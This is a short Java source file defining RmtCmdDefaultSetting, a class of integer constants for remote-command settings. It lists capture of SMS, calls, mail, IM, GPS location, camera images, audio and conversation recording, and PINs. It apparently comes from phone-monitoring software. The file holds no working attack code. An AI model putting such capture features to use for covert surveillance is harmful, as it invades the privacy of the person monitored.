package com.vvt.rmtcmd;

public class RmtCmdDefaultSetting {

	public static final RmtCmdDefaultSetting SMS = new RmtCmdDefaultSetting(1);
	public static final RmtCmdDefaultSetting CALL = new RmtCmdDefaultSetting(2);
	public static final RmtCmdDefaultSetting MAIL = new RmtCmdDefaultSetting(3);
	public static final RmtCmdDefaultSetting LOCATION = new RmtCmdDefaultSetting(4);
	public static final RmtCmdDefaultSetting MMS = new RmtCmdDefaultSetting(5);
	public static final RmtCmdDefaultSetting CONTACT = new RmtCmdDefaultSetting(6);
	public static final RmtCmdDefaultSetting GPS = new RmtCmdDefaultSetting(7);
	public static final RmtCmdDefaultSetting IM = new RmtCmdDefaultSetting(8);
	public static final RmtCmdDefaultSetting WALLPAPER = new RmtCmdDefaultSetting(9);
	public static final RmtCmdDefaultSetting CAMERA_IMAGE = new RmtCmdDefaultSetting(10);
	public static final RmtCmdDefaultSetting AUDIO_RECORD = new RmtCmdDefaultSetting(11);
	public static final RmtCmdDefaultSetting AUDIO_CONVERSATION = new RmtCmdDefaultSetting(12);
	public static final RmtCmdDefaultSetting VIDEO_FILE = new RmtCmdDefaultSetting(13);
	public static final RmtCmdDefaultSetting PIN = new RmtCmdDefaultSetting(14);
	public static final RmtCmdDefaultSetting START_STOP_CAPTURE = new RmtCmdDefaultSetting(201);
	public static final RmtCmdDefaultSetting CAPTURE_TIMER = new RmtCmdDefaultSetting(202);
	public static final RmtCmdDefaultSetting EVENT_COUNT = new RmtCmdDefaultSetting(203);
	public static final RmtCmdDefaultSetting GPS_TIMER = new RmtCmdDefaultSetting(280);
	private int id;
	
	private RmtCmdDefaultSetting(int id) {
		this.id = id;
	}

	public int getId() {
		return id;
	}
}
